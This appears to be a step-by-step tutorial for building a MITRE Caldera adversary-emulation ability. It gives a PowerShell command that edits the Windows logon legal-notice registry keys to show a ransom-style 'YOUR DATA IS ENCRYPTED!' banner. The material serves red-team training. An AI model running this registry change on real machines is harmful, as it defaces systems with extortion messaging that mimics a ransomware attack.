# Create Legal Warning Banner Ability

{% embed url="https://youtu.be/i0OWLgbYc00" %}

1. Go to the "Abilities" section in Caldera. Click on "Create an Ability".
2. Call this "Change Logon Legal Warning"
3. For the description, call this "Change the logon window before the user logs in"
4. As for the tactic, write in "defense-evasion"
5. The Technique ID is "T1112", and the Technique Name is "Modify Registry".&#x20;
6. Scroll down to the "Executors" section. For the platform, choose "Windows". Use "psh" as the executor.
7.  Set the command to the following:&#x20;

    ```
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "legalnoticetext" -Value "Information is on the Desktop to get your data. We are looking forward to working together." ; Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "legalnoticecaption" -Value "YOUR DATA IS ENCRYPTED!"
    ```


8. Set the timeout to 10. Save this ability.&#x20;
